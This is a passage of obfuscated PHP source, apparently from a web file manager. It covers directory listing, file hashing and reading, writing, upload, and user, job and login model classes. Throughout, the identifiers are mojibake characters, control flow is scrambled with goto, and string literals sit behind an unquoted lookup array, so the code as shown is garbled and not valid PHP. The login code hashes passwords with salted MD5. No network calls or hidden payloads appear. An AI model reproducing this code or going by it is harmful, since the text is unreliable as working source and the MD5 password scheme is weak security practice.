1, $C™Ñ‡Áãø¸[84] => @filemtime($FšÇ©÷­çÇ), $C™Ñ‡Áãø¸[78] => 0); $this->listAll($FšÇ©÷­çÇ, $BÔ¸„—†¢—); } else { $BÔ¸„—†¢—[] = array($C™Ñ‡Áãø¸[76] => $FšÇ©÷­çÇ, $C™Ñ‡Áãø¸[77] => 0, $C™Ñ‡Áãø¸[84] => @filemtime($FšÇ©÷­çÇ), $C™Ñ‡Áãø¸[78] => $this->size($FšÇ©÷­çÇ)); } } closedir($aËÚ‚Ëğƒ—); goto c¤ªã†êù²; A×È”Äˆ‚–: $C™Ñ‡Áãø¸ =& $_SERVER[›é¼±]; $d¹ôñÂ°¤ = $this->iconvSystem($d¹ôñÂ°¤); $d¹ôñÂ°¤ = rtrim($d¹ôñÂ°¤, $C™Ñ‡Áãø¸[8]) . $C™Ñ‡Áãø¸[8]; goto cšÓ‚Ïç½; c¤ªã†êù²: return $BÔ¸„—†¢—; goto FäˆÜ„Ó‰; FäˆÜ„Ó‰: } public function has($D»½œäÃÍĞ, $D•”–­¥‘Ã = false, $C¥÷¤´øî¾ = true) { goto C‚§„Š“‘Ü; E¡È¤¡ÛÜ÷: if (!($c««¬àÉ¨Í = @opendir($D»½œäÃÍĞ))) { return !1; } $fÌÙğŠéÅ‡ = 0; $C§ÈÄäÅùà = 0; goto aíòÊšÚ¹É; C‚§„Š“‘Ü: $AâªÉ§‚Ÿ =& $_SERVER[›é¼±]; $D»½œäÃÍĞ = $this->iconvSystem($D»½œäÃÍĞ); $D»½œäÃÍĞ = rtrim($D»½œäÃÍĞ, $AâªÉ§‚Ÿ[8]) . $AâªÉ§‚Ÿ[8]; goto E¡È¤¡ÛÜ÷; aíòÊšÚ¹É: $AÕÄñ™‰³œ = 0; while (($A’œ›‡ÓÎİ = readdir($c««¬àÉ¨Í)) !== !1) { if ($A’œ›‡ÓÎİ == $AâªÉ§‚Ÿ[95] || $A’œ›‡ÓÎİ == $AâªÉ§‚Ÿ[1285]) { continue; } $aÙ‘Şœ¸‚ = $D»½œäÃÍĞ . $A’œ›‡ÓÎİ; if ($D•”–­¥‘Ã) { $AÕÄñ™‰³œ++; if (@is_file($aÙ‘Şœ¸‚)) { $fÌÙğŠéÅ‡++; } else { $C§ÈÄäÅùà++; } if ($AÕÄñ™‰³œ > 10000) { break; } continue; } if ($C¥÷¤´øî¾) { if (@is_file($aÙ‘Şœ¸‚)) { return !0; } } else { if (@is_dir($aÙ‘Şœ¸‚ . $AâªÉ§‚Ÿ[8])) { return !0; } } } closedir($c««¬àÉ¨Í); goto d·‰†ê‘ò; d·‰†ê‘ò: if ($D•”–­¥‘Ã) { return array($AâªÉ§‚Ÿ[203] => $fÌÙğŠéÅ‡, $AâªÉ§‚Ÿ[204] => $C§ÈÄäÅùà); } return !1; goto f‚å‚¡; f‚å‚¡: } public function hashSimple($FŒÔ‹îèâ‘) { goto B­§ÚÛ¹†; fÃÙ›¦¢‘œ: $eÉ‘¶ìÄé¨ = $this->size($FŒÔ‹îèâ‘); $Fß— å¸È = 200; $C‚É×˜İêà = 50; goto Bµ‰ÜÀ§Ù; DÜÁ¯ÑÏõÖ: $e‘÷•ƒÊåÔ = fopen($FŒÔ‹îèâ‘, $Dƒøáƒà‚Õ[1292]); if (!$e‘÷•ƒÊåÔ) { return $aÉ«ùÍÒ¾Å; } for ($F¼ïã¥¢Œ“ = 0; $F¼ïã¥¢Œ“ < $C‚É×˜İêà; $F¼ïã¥¢Œ“++) { fseek_64($e‘÷•ƒÊåÔ, $a†Î£ÎëÕ * $F¼ïã¥¢Œ“); $aÉ«ùÍÒ¾Å .= fread($e‘÷•ƒÊåÔ, $Fß— å¸È); } goto CÚÊ·§œ­½; B·¾Æ†¬ê‚: return md5($aÉ«ùÍÒ¾Å) . $eÉ‘¶ìÄé¨; goto aÙÆÒÕÆÆß; B­§ÚÛ¹†: $Dƒøáƒà‚Õ =& $_SERVER[›é¼±]; if (!$FŒÔ‹îèâ‘) { return md5($Dƒøáƒà‚Õ[33]); } $FŒÔ‹îèâ‘ = $this->iconvSystem($FŒÔ‹îèâ‘); goto fÃÙ›¦¢‘œ; Bµ‰ÜÀ§Ù: if ($eÉ‘¶ìÄé¨ <= $Fß— å¸È * $C‚É×˜İêà) { return $this->hashMd5($FŒÔ‹îèâ‘) . $eÉ‘¶ìÄé¨; } $aÉ«ùÍÒ¾Å = $Dƒøáƒà‚Õ[33]; $a†Î£ÎëÕ = intval($eÉ‘¶ìÄé¨ / $C‚É×˜İêà); goto DÜÁ¯ÑÏõÖ; CÚÊ·§œ­½: fseek_64($e‘÷•ƒÊåÔ, $eÉ‘¶ìÄé¨ - $Fß— å¸È); $aÉ«ùÍÒ¾Å .= fread($e‘÷•ƒÊåÔ, $Fß— å¸È); fclose($e‘÷•ƒÊåÔ); goto B·¾Æ†¬ê‚; aÙÆÒÕÆÆß: } public function getContent($FÃò–˜†ßê) { $FÃò–˜†ßê = $this->iconvSystem($FÃò–˜†ßê); return file_get_contents($FÃò–˜†ßê); } public function setContent($b©´ŠŒÓëİ, $b‹Üó´º¤ = '') { $b©´ŠŒÓëİ = $this->iconvSystem($b©´ŠŒÓëİ); $cË¦ÂÆ–ÙÜ = @file_put_contents($b©´ŠŒÓëİ, $b‹Üó´º¤, LOCK_EX); clearstatcache(); @chmod($b©´ŠŒÓëİ, $this->pathAuth); return $cË¦ÂÆ–ÙÜ === !1 ? !1 : !0; } public function fileSubstr($E±Š½¯Á‚ñ, $B­á›“Ÿì– = 0, $b±ø¿íÚğÒ = false) { goto b÷‰Ù¡Ê±½; AÕ¥‡òï²: if ($b±ø¿íÚğÒ <= 0) { return $f³é—¿á¤[33]; } $b¼¢ÕÕ®™ˆ = fopen($E±Š½¯Á‚ñ, $f³é—¿á¤[1292]); if (!$b¼¢ÕÕ®™ˆ) { return !1; } goto f•Ú÷î¦¶‰; b„ƒ‚ø›•ã: return $cääö©¡Í; goto aÁâèÖªï„; b÷‰Ù¡Ê±½: $f³é—¿á¤ =& $_SERVER[›é¼±]; $E±Š½¯Á‚ñ = $this->iconvSystem($E±Š½¯Á‚ñ); if ($b±ø¿íÚğÒ === !1) { $b±ø¿íÚğÒ = $this->size($E±Š½¯Á‚ñ); } goto AÕ¥‡òï²; f•Ú÷î¦¶‰: fseek_64($b¼¢ÕÕ®™ˆ, $B­á›“Ÿì–); $cääö©¡Í = fread($b¼¢ÕÕ®™ˆ, $b±ø¿íÚğÒ); fclose($b¼¢ÕÕ®™ˆ); goto b„ƒ‚ø›•ã; aÁâèÖªï„: } public function upload($B´–º¬óñ©, $Fé¾ÓÕÅÕ…, $d™µöÂ¨àƒ = false, $E¹ñÎ°©éŸ = REPEAT_REPLACE) { if ($d™µöÂ¨àƒ) { return $this->moveFile($Fé¾ÓÕÅÕ…, $B´–º¬óñ©); } return $this->copyFile($Fé¾ÓÕÅÕ…, $B´–º¬óñ©); } public function setModifyTime($B–ß×ÌêŠê, $FÑè’’ä = '') { @touch($B–ß×ÌêŠê, intval($FÑè’’ä)); } public function download($Eî±¹Ë«Ú®, $Fğ™æøĞä«) { return $this->iconvSystem($Eî±¹Ë«Ú®); } } goto BĞÁñŞäØŠ; Cêò—ßÒ¡ò: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x6a\x6f\x62\x4c\x69\x73\x74"; public $field = array("\156\x61\155\145", "\144\x65\163\x63", "\x73\157\x72\164"); const JOB_KEY = "\163\x65\x6c\x66\112\x6f\142\x4c\151\163\164"; public function listData($dğø·ÁêäË = false, $bñˆÅ‘•ñ = "\163\x6f\162\164", $C±Û”ºŠ»Ç = false) { return parent::listData($dğø·ÁêäË, $bñˆÅ‘•ñ, $C±Û”ºŠ»Ç); } public function remove($b¥•óƒÅ£¬) { return parent::remove($b¥•óƒÅ£¬); } public function add($dÔÔÍ¹Ú‡) { $BßÕ‡º……— =& $_SERVER[›é¼±]; if ($this->findByName($dÔÔÍ¹Ú‡[$BßÕ‡º……—[28]])) { return !1; } $dÔÔÍ¹Ú‡[$BßÕ‡º……—[1756]] = $this->getSort(); return parent::insert($dÔÔÍ¹Ú‡); } private function getSort() { $FƒÈ©ŒîŞ» =& $_SERVER[›é¼±]; $cè´ùèéâµ = parent::listData(); $bÛğ›ˆóˆ¼ = array_to_keyvalue($cè´ùèéâµ, $FƒÈ©ŒîŞ»[33], $FƒÈ©ŒîŞ»[1756]); return empty($bÛğ›ˆóˆ¼) ? 0 : max($bÛğ›ˆóˆ¼) + 1; } public function update($eæÚÚïÁÈ‹, $cñêéô³¼) { $DÕèòˆ =& $_SERVER[›é¼±]; $E•­ö“¹àÖ = parent::listData($eæÚÚïÁÈ‹); $fÍíˆ·¸À§ = $this->findByName($cñêéô³¼[$DÕèòˆ[28]]); if (!$E•­ö“¹àÖ || $fÍíˆ·¸À§ && $fÍíˆ·¸À§[$DÕèòˆ[395]] != $E•­ö“¹àÖ[$DÕèòˆ[395]]) { return !1; } return parent::update($eæÚÚïÁÈ‹, $cñêéô³¼); } public function setUserJob($DÛˆçäÈ†Ó, $BÃƒíö‘Ô) { goto dŠÇ”„š–æ; AÀ½·†Ù‚à: $AÌÆïÄ‹¯ = rtrim($AÌÆïÄ‹¯, $A°ª¬Ÿ»Á[47]); Model($A°ª¬Ÿ»Á[532])->metaSet($DÛˆçäÈ†Ó, self::JOB_KEY, $AÌÆïÄ‹¯); goto Fİ…íÁÖ¬°; f„°Ä¬Öï: $c«¯¦ŞºÁ¼ = array_to_keyvalue($c¸ˆÙÌ¬¹ß, $A°ª¬Ÿ»Á[28]); $AÌÆïÄ‹¯ = $A°ª¬Ÿ»Á[376]; foreach ($BÃƒíö‘Ô as $c”±•‹çœ) { if ($c«¯¦ŞºÁ¼[$c”±•‹çœ]) { $AÌÆïÄ‹¯ .= $c«¯¦ŞºÁ¼[$c”±•‹çœ][$A°ª¬Ÿ»Á[395]] . $A°ª¬Ÿ»Á[47]; } else { $bÀ­š°‘â = $this->add($c”±•‹çœ); $AÌÆïÄ‹¯ .= $bÀ­š°‘â . $A°ª¬Ÿ»Á[47]; } } goto AÀ½·†Ù‚à; dŠÇ”„š–æ: $A°ª¬Ÿ»Á =& $_SERVER[›é¼±]; if (!is_array($BÃƒíö‘Ô)) { $BÃƒíö‘Ô = array($BÃƒíö‘Ô); } $c¸ˆÙÌ¬¹ß = parent::listData(); goto f„°Ä¬Öï; Fİ…íÁÖ¬°: } public function getUserJob($aÈáÍÂÎ‰) { $e™îçòÒ¸° = Model($_SERVER[›é¼±][532])->metaGet($aÈáÍÂÎ‰); return $this->getUserJobInfo($e™îçòÒ¸°[self::JOB_KEY]); } public function getUserJobInfo($a¹‚„ãÉÌ„) { goto B¬¬¢í†ŒÛ; B¬¬¢í†ŒÛ: $Aé¿ÖÆ¡Œß =& $_SERVER[›é¼±]; $Dñš£Ì´Ì = explode($Aé¿ÖÆ¡Œß[47], $a¹‚„ãÉÌ„); $eàªØÏÅ = parent::listData(); goto E§Ÿ½Ï˜èø; E§Ÿ½Ï˜èø: $eàªØÏÅ = array_remove_key($eàªØÏÅ, $Aé¿ÖÆ¡Œß[194]); $d‚ÍÁ‹‡†å = array(); foreach ($Dñš£Ì´Ì as $E ÂøÉ›Âí) { if (isset($eàªØÏÅ[$E ÂøÉ›Âí])) { $d‚ÍÁ‹‡†å[] = $eàªØÏÅ[$E ÂøÉ›Âí]; } } goto C£•”É°©¤; C£•”É°©¤: return $d‚ÍÁ‹‡†å; goto bƒŠÕ³Í«»; bƒŠÕ³Í«»: } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\164\141\x62\x6c\145\116\x61\155\145" => "\x75\163\145\x72\137\155\145\x74\141", "\155\145\164\141\x46\151\145\x6c\x64" => "\x75\163\x65\x72\111\x44"); protected $simpleField = "\x75\x73\145\162\111\x44\54\156\x69\143\x6b\x4e\x61\155\x65\54\156\141\x6d\x65\x2c\x61\166\141\x74\141\162\x2c\163\x65\x78\x2c\163\x74\141\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($A— íòÅ¦Ä) { $Dàà˜Ì©‰¡ =& $_SERVER[›é¼±]; $a¶ŞêŒæ°Š = $Dàà˜Ì©‰¡[2158]; return array($Dàà˜Ì©‰¡[1807] => array($A— íòÅ¦Ä[0], $a¶ŞêŒæ°Š), $Dàà˜Ì©‰¡[1809] => array($A— íòÅ¦Ä[0], $a¶ŞêŒæ°Š), $Dàà˜Ì©‰¡[2159] => array($A— íòÅ¦Ä[0], $a¶ŞêŒæ°Š)); } protected function getInfo($féÛ›Ç¯±ñ, $a‚å×Öî’ = false) { $dÏõŸé¤…õ = $this->getInfoSimple($féÛ›Ç¯±ñ); if (!is_array($dÏõŸé¤…õ)) { return array(); } if ($a‚å×Öî’) { return $this->_getInfoApply($dÏõŸé¤…õ); } return $this->cacheFunctionGet($_SERVER[›é¼±][1811], $féÛ›Ç¯±ñ); } protected function getInfoFull($C÷‘”¤‚ŒÛ, $AÛœÏÄŒŸÊ = false) { $cÙª‰áÔÆÏ = $this->getInfoSimple($C÷‘”¤‚ŒÛ); if (!is_array($cÙª‰áÔÆÏ)) { return array(); } if ($AÛœÏÄŒŸÊ) { return $this->_getInfoApply($cÙª‰áÔÆÏ, !0); } return $this->cacheFunctionGet($_SERVER[›é¼±][2160], $C÷‘”¤‚ŒÛ); } private function _getInfoApply($aÙß²‹¡õ, $d‡Ÿæ‚¯Ñª = false) { goto b½îƒ¸©±; b½îƒ¸©±: $Cå«×Ë =& $_SERVER[›é¼±]; if (!$aÙß²‹¡õ) { return $aÙß²‹¡õ; } $A‡ŸõÏ‚¤Ê = md5($Cå«×Ë[2161] . $aÙß²‹¡õ[$Cå«×Ë[884]] . $Cå«×Ë[2162] . $aÙß²‹¡õ[$Cå«×Ë[28]]); goto dòäîœïÙÑ; dòäîœïÙÑ: $aÙß²‹¡õ = $this->_listDataApplyItem($aÙß²‹¡õ); $cÑìÆµ£â = Model($Cå«×Ë[1239])->metaGet($aÙß²‹¡õ[$Cå«×Ë[85]][$Cå«×Ë[397]]); $aÙß²‹¡õ[$Cå«×Ë[2163]] = $A‡ŸõÏ‚¤Ê; goto c³Í©«ƒ‰º; c³Í©«ƒ‰º: $aÙß²‹¡õ[$Cå«×Ë[85]][$Cå«×Ë[1994]] = isset($cÑìÆµ£â[$Cå«×Ë[1995]]) ? $cÑìÆµ£â[$Cå«×Ë[1995]] : null; if ($d‡Ÿæ‚¯Ñª) { $aÙß²‹¡õ[$Cå«×Ë[459]] = $this->metaGet($aÙß²‹¡õ[$Cå«×Ë[1564]]); } return $aÙß²‹¡õ; goto D”ÛÏ½è÷ê; D”ÛÏ½è÷ê: } protected function getInfoSimple($f¸éï‹¶¡œ, $e®÷¬Å¦É = false) { $aÙäØõ‡õ =& $_SERVER[›é¼±]; if (!$f¸éï‹¶¡œ) { return array(); } if ($e®÷¬Å¦É) { $d¡‰‡‡Å = $this->where(array($aÙäØõ‡õ[1564] => intval($f¸éï‹¶¡œ)))->find(); if (!is_array($d¡‰‡‡Å)) { return array(); } $d¡‰‡‡Å[$aÙäØõ‡õ[2164]] = Action($aÙäØõ‡õ[2165])->parseUrl($d¡‰‡‡Å[$aÙäØõ‡õ[2164]]); return $d¡‰‡‡Å; } return $this->cacheFunctionGet($aÙäØõ‡õ[1812], $f¸éï‹¶¡œ); } protected function getInfoSimpleOuter($dÛÛ–³æƒ) { goto eÙİ‘–«èë; eÙİ‘–«èë: $bô¿î¡ÉÍå =& $_SERVER[›é¼±]; if (!$dÛÛ–³æƒ || $dÛÛ–³æƒ == 0) { return array($bô¿î¡ÉÍå[1564] => $bô¿î¡ÉÍå[191], $bô¿î¡ÉÍå[28] => $bô¿î¡ÉÍå[160] . LNG($bô¿î¡ÉÍå[2166]) . $bô¿î¡ÉÍå[530], $bô¿î¡ÉÍå[2164] => STATIC_PATH . $bô¿î¡ÉÍå[2167]); } $DŒ„ŞŒÍ˜À = $this->cacheFunctionGet($bô¿î¡ÉÍå[1812], $dÛÛ–³æƒ); goto Bø½‘³¬¥Ì; Bø½‘³¬¥Ì: $EØæ©ë…Ì— = array_field_key($DŒ„ŞŒÍ˜À, explode($bô¿î¡ÉÍå[47], $this->simpleField)); if (!$EØæ©ë…Ì—) { return array($bô¿î¡ÉÍå[1564] => $bô¿î¡ÉÍå[1118], $bô¿î¡ÉÍå[28] => $bô¿î¡ÉÍå[160] . LNG($bô¿î¡ÉÍå[2168]) . $bô¿î¡ÉÍå[530], $bô¿î¡ÉÍå[2164] => STATIC_PATH . $bô¿î¡ÉÍå[2169]); } $EØæ©ë…Ì—[$bô¿î¡ÉÍå[2164]] = Action($bô¿î¡ÉÍå[2165])->parseUrl($EØæ©ë…Ì—[$bô¿î¡ÉÍå[2164]]); goto D²Û‘Í¿¶ë; D²Û‘Í¿¶ë: return $EØæ©ë…Ì—; goto D¢È¶‰®”ç; D¢È¶‰®”ç: } protected function groupUser($B¨Ö‚ÓŸˆ) { } public static function errorLang($bÔâíôôòê) { $f™Ñß•Û¼È =& $_SERVER[›é¼±]; $e«ãéÔ¨ = array(self::ERROR_USER_NOT_EXISTS => $f™Ñß•Û¼È[2170], self::ERROR_USER_PASSWORD_ERROR => $f™Ñß•Û¼È[2171], self::ERROR_USER_EXIST_NAME => $f™Ñß•Û¼È[2172], self::ERROR_USER_EXIST_PHONE => $f™Ñß•Û¼È[2173], self::ERROR_USER_EXIST_EMAIL => $f™Ñß•Û¼È[2174], self::ERROR_USER_LOGIN_LOCK => $f™Ñß•Û¼È[2175], self::ERROR_IP_NOT_ALLOW => $f™Ñß•Û¼È[2176], self::ERROR_USER_EXIST_NICKNAME => $f™Ñß•Û¼È[2177]); return LNG($e«ãéÔ¨[$bÔâíôôòê]); } public function getInfoByMeta($cÅ¯½ÂŒ‚, $a¢®„Ÿ‘) { $a«Ñ„ÁÓã• =& $_SERVER[›é¼±]; $AÔÖŞÒ­Ş = Model($a«Ñ„ÁÓã•[2178])->where(array($a«Ñ„ÁÓã•[93] => $cÅ¯½ÂŒ‚, $a«Ñ„ÁÓã•[372] => $a¢®„Ÿ‘))->find(); if ($AÔÖŞÒ­Ş) { return $this->getInfo($AÔÖŞÒ­Ş[$a«Ñ„ÁÓã•[1564]]); } return !1; } public function userLoginCheck($Aˆ¯²µª, $FñĞŒ¬») { $BÑ¶Èïò†× =& $_SERVER[›é¼±]; $AÆ©¦©œÓ» = $this->userLoginFind($Aˆ¯²µª); if (!$AÆ©¦©œÓ») { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($AÆ©¦©œÓ»[$BÑ¶Èïò†×[1564]], $FñĞŒ¬»)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($AÆ©¦©œÓ»[$BÑ¶Èïò†×[1564]]); } public function userLoginFind($c ºŠ°Ü…Õ) { $FŠæìÆóé‹ =& $_SERVER[›é¼±]; $CÑÎ¿Ş‹ËÙ = array($FŠæìÆóé‹[28] => $c ºŠ°Ü…Õ, $FŠæìÆóé‹[1998] => $c ºŠ°Ü…Õ, $FŠæìÆóé‹[303] => $c ºŠ°Ü…Õ, $FŠæìÆóé‹[2179] => $c ºŠ°Ü…Õ, $FŠæìÆóé‹[992] => $FŠæìÆóé‹[994]); if ($this->nickNameRpt()) { unset($CÑÎ¿Ş‹ËÙ[$FŠæìÆóé‹[1998]]); } return $this->where($CÑÎ¿Ş‹ËÙ)->find(); } public function clearCache($fœöÁ¡ÄÑ) { $c¼µè“ç¶ =& $_SERVER[›é¼±]; $this->cacheFunctionClear($c¼µè“ç¶[1811], $fœöÁ¡ÄÑ); $this->cacheFunctionClear($c¼µè“ç¶[1812], $fœöÁ¡ÄÑ); $this->cacheFunctionClear($c¼µè“ç¶[2160], $fœöÁ¡ÄÑ); } public function userPasswordCheck($f§‘²Øğƒ, $f‡»ºï„šö) { $B‘ ì =& $_SERVER[›é¼±]; $AâÕßì«¯‹ = $this->where(array($B‘ ì[1564] => intval($f§‘²Øğƒ)))->find(); $DÃĞ°º¨ÅÀ = $this->metaGet($f§‘²Øğƒ); $FÂ†§š‡ø = isset($DÃĞ°º¨ÅÀ[$B‘ ì[2180]]) ? $DÃĞ°º¨ÅÀ[$B‘ ì[2180]] : $B‘ ì[33]; if (md5($FÂ†§š‡ø . trim($f‡»ºï„šö)) !== $AâÕßì«¯‹[$B‘ ì[884]]) { return !1; } return !0; } public function userAdd($a‰ñö»ù†) { goto BÊñÁì“¢À; Aôì„ì¤í¦: return $A²Ø¸¶Ñ—; goto A¨ĞÙ‰¯öƒ; BÊñÁì“¢À: $A‰à¾„ÕñÍ =& $_SERVER[›é¼±]; $D·µ‹î½¨‡ = array($A‰à¾„ÕñÍ[415] => $a‰ñö»ù†[$A‰à¾„ÕñÍ[28]], $A‰à¾„ÕñÍ[2181] => $a‰ñö»ù†[$A‰à¾„ÕñÍ[1444]], $A‰à¾„ÕñÍ[2182] => isset($a‰ñö»ù†[$A‰à¾„ÕñÍ[303]]) ? $a‰ñö»ù†[$A‰à¾„ÕñÍ[303]] : $A‰à¾„ÕñÍ[33], $A‰à¾„ÕñÍ[2183] => isset($a‰ñö»ù†[$A‰à¾„ÕñÍ[2179]]) ? $a‰ñö»ù†[$A‰à¾„ÕñÍ[2179]] : $A‰à¾„ÕñÍ[33], $A‰à¾„ÕñÍ[2184] => isset($a‰ñö»ù†[$A‰à¾„ÕñÍ[1998]]) ? $a‰ñö»ù†[$A‰à¾„ÕñÍ[1998]] : $a‰ñö»ù†[$A‰à¾„ÕñÍ[28]], $A‰à¾„ÕñÍ[2185] => isset($a‰ñö»ù†[$A‰à¾„ÕñÍ[2164]]) ? $a‰ñö»ù†[$A‰à¾„ÕñÍ[2164]] : $A‰à¾„ÕñÍ[33], $A‰à¾„ÕñÍ[2186] => isset($a‰ñö»ù†[$A‰à¾„ÕñÍ[2187]]) ? $a‰ñö»ù†[$A‰à¾„ÕñÍ[2187]] : 1, $A‰à¾„ÕñÍ[2188] => $a‰ñö»ù†[$A‰à¾„ÕñÍ[884]], $A‰à¾„ÕñÍ[1813] => isset($a‰ñö»ù†[$A‰à¾„ÕñÍ[1717]]) ? $a‰ñö»ù†[$A‰à¾„ÕñÍ[1717]] : 1024 * 1024 * 20, $A‰à¾„ÕñÍ[1814] => 0, $A‰à¾„ÕñÍ[2189] => 0, $A‰à¾„ÕñÍ[1856] => isset($a‰ñö»ù†[$A‰à¾„ÕñÍ[745]]) ? $a‰ñö»ù†[$A‰à¾„ÕñÍ[745]] : 1); if (!empty($a‰ñö»ù†[$A‰à¾„ÕñÍ[1564]])) { $D·µ‹î½¨‡[$A‰à¾„ÕñÍ[1564]] = $a‰ñö»ù†[$A‰à¾„ÕñÍ[1564]]; } goto F†¨¿ŞÅ½; F°¬¯öĞêä: $aÖ©Íİ…¡ = array($A‰à¾„ÕñÍ[2188] => $D·µ‹î½¨‡[$A‰à¾„ÕñÍ[884]], $A‰à¾„ÕñÍ[2184] => $D·µ‹î½¨‡[$A‰à¾„ÕñÍ[1998]]); $this->userEdit($A²Ø¸¶Ñ—, $aÖ©Íİ…¡); Model($A‰à¾„ÕñÍ[1239])->userRootAdd($A²Ø¸¶Ñ—); goto Aôì„ì¤í¦; F†¨¿ŞÅ½: $EªËï·òªö = $this->_checkExist($a‰ñö»ù†); if ($EªËï·òªö !== !0) { return $EªËï·òªö; } $A²Ø¸¶Ñ— = $this->add($D·µ‹î½¨‡); goto F°¬¯öĞêä; A¨ĞÙ‰¯öƒ: } protected function userEditTest($eø‘§è¸ê, $E‹ÉÛ¤›„İ) { return $this->call($_SERVER[›é¼±][2190], $eø‘§è¸ê, $E‹ÉÛ¤›„İ); } protected function userEdit($e»öˆÆò›¬, $E¼óÌÂÜ³ƒ) { goto F¾Ê°¡ÕÁ¯; b¯†† İ¡ê: $this->where(array($aÇºŠ›ÃÅÑ[1555] => $e»öˆÆò›¬))->save($E¼óÌÂÜ³ƒ); if (isset($E¼óÌÂÜ³ƒ[$aÇºŠ›ÃÅÑ[1998]])) { $this->setNamePinyin($e»öˆÆò›¬, $E¼óÌÂÜ³ƒ[$aÇºŠ›ÃÅÑ[1998]]); } $this->clearCache($e»öˆÆò›¬); goto Eº¹ÚøÙğ; dô¿®÷Õ…: $DŠ‰–ÏÎ§í = $this->_checkExist($E¼óÌÂÜ³ƒ, $e»öˆÆò›¬); if ($DŠ‰–ÏÎ§í !== !0) { return $DŠ‰–ÏÎ§í; } if (isset($E¼óÌÂÜ³ƒ[$aÇºŠ›ÃÅÑ[884]]) && trim($E¼óÌÂÜ³ƒ[$aÇºŠ›ÃÅÑ[884]]) != $aÇºŠ›ÃÅÑ[33]) { $D¼«ñ¢ö = $this->metaGet($e»öˆÆò›¬); if (empty($D¼«ñ¢ö[$aÇºŠ›ÃÅÑ[2180]])) { $D¼«ñ¢ö[$aÇºŠ›ÃÅÑ[2180]] = rand_string(10); Model($aÇºŠ›ÃÅÑ[507])->metaSet($e»öˆÆò›¬, $aÇºŠ›ÃÅÑ[2180], $D¼«ñ¢ö[$aÇºŠ›ÃÅÑ[2180]]); } $E¼óÌÂÜ³ƒ[$aÇºŠ›ÃÅÑ[884]] = md5($D¼«ñ¢ö[$aÇºŠ›ÃÅÑ[2180]] . trim($E¼óÌÂÜ³ƒ[$aÇºŠ›ÃÅÑ[884]])); } else { unset($E¼óÌÂÜ³ƒ[$aÇºŠ›ÃÅÑ[884]]); } goto b¯†† İ¡ê; F¾Ê°¡ÕÁ¯: $aÇºŠ›ÃÅÑ =& $_SERVER[›é¼±]; $A¥¼£ Õ¶¸ = $this->getInfoSimple($e»öˆÆò›¬); if (!$A¥¼£ Õ¶¸) { return !1; } goto dô¿®÷Õ…; Eº¹ÚøÙğ: return !0; goto CÚ““—ÂĞ—; CÚ““—ÂĞ—: } public function setNamePinyin($F„ÌŞˆ¤ç™, $Aäê‡¨² = false) { $c–‚—ÖŠ‰° =& $_SERVER[›é¼±]; if (!$Aäê‡¨²) { $f˜ó° ©¬× = $this->getInfoSimple($F„ÌŞˆ¤ç™); $Aäê‡¨² = $f˜ó° ©¬×[$c–‚—ÖŠ‰°[1998]] ? $f˜ó° ©¬×[$c–‚—ÖŠ‰°[1998]] : $f˜ó° ©¬×[$c–‚—ÖŠ‰°[28]]; } $Eæ˜ ôÚÂÌ = Model($c–‚—ÖŠ‰°[532]); if (!Input::check($Aäê‡¨², $c–‚—ÖŠ‰°[581])) { return $Eæ˜ ôÚÂÌ->metaSet($F„ÌŞˆ¤ç™, array($c–‚—ÖŠ‰°[458] => $c–‚—ÖŠ‰°[33], $c–‚—ÖŠ‰°[457] => $c–‚—ÖŠ‰°[33])); } return $Eæ˜ ôÚÂÌ->metaSet($F„ÌŞˆ¤ç™, array($c–‚—ÖŠ‰°[458] => str_replace($c–‚—ÖŠ‰°[50], $c–‚—ÖŠ‰°[33], Pinyin::get($Aäê‡¨²)), $c–‚—ÖŠ‰°[457] => Pinyin::get($Aäê‡¨², $c–‚—ÖŠ‰°[582]))); } private function nickNameRpt() { $BÉ³„åôœ =& $_SERVER[›é¼±]; $E¼ßÀõÌçå = Model($BÉ³„åôœ[765])->get($BÉ³„åôœ[2191]); $Eğá‡æŒÅ° = $GLOBALS[$BÉ³„åôœ[6]][$BÉ³„åôœ[379]][$BÉ³„åôœ[2191]]; $F…œ™ÒÍ› = !is_null($E¼ßÀõÌçå) ? $E¼ßÀõÌçå : $Eğá‡æŒÅ°; return !!$F…œ™ÒÍ›; } private function _checkExist($fì¹§÷ä, $dµ©†öó© = false) { $E¢ô¦›à•› =& $_SERVER[›é¼±]; $C† Ì¡ƒ¨ø = array($E¢ô¦›à•›[28] => UserModel::ERROR_USER_EXIST_NAME, $E¢ô¦›à•›[1998] => UserModel::ERROR_USER_EXIST_NICKNAME, $E¢ô¦›à•›[303] => UserModel::ERROR_USER_EXIST_EMAIL, $E¢ô¦›à•›[2179] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($C† Ì¡ƒ¨ø[$E¢ô¦›à•›[1998]]); } $C£ˆ»ÍÑ±Ü = $dµ©†öó© ? array($E¢ô¦›à•›[1564] => array($E¢ô¦›à•›[2192], $dµ©†öó©)) : array(); foreach ($C† Ì¡ƒ¨ø as $a¯ İ´ŞÆ” => $FÏ°™™¾Â) { $E´ƒ»Äõ¾° = array(); foreach ($C† Ì¡ƒ¨ø as $Dç˜Ú›¶é¬ => $F™ÒÀİå‡Ş) { if (isset($fì¹§÷ä[$Dç˜Ú›¶é¬]) && $fì¹§÷ä[$Dç˜Ú›¶é¬]) { $E´ƒ»Äõ¾°[] = $fì¹§÷ä[$Dç˜Ú›¶é¬]; } } if (!$E´ƒ»Äõ¾°) { continue; } $a ©Å‹Î = array_merge(array($a¯ İ´ŞÆ” => array($E¢ô¦›à•›[7], $E´ƒ»Äõ¾°)), $C£ˆ»ÍÑ±Ü); $BÚäŠÄóä¶ = $this->where($a ©Å‹Î)->find(); if ($BÚäŠÄóä¶) { return $FÏ°™™¾Â; } } return !0; } public function userListInfo($cµÜÌ„§Ñª) { $b†„Âîß‹™ =& $_SERVER[›é¼±]; $dï™¶Ÿö©š = array(); $cµÜÌ„§Ñª = is_array($cµÜÌ„§Ñª) ? array_unique($cµÜÌ„§Ñª) : array(); if 